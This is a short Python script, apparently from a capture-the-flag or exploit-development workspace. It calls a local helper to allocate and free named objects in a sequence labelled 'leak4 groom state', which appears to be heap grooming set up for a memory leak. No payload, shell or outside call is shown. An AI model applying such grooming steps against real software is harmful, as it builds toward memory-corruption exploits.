import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
g.add(b'A1'); g.add(b'B2'); g.make(b'bAB'); g.add(b'YY'); g.add(b'W3'); g.make(b'bW')
g.rm(b'B2'); g.rm(b'W3'); g.rm(b'YY'); g.rm(b'A1'); g.add(b'CC')
g.dump('leak4 groom state')
g.close()
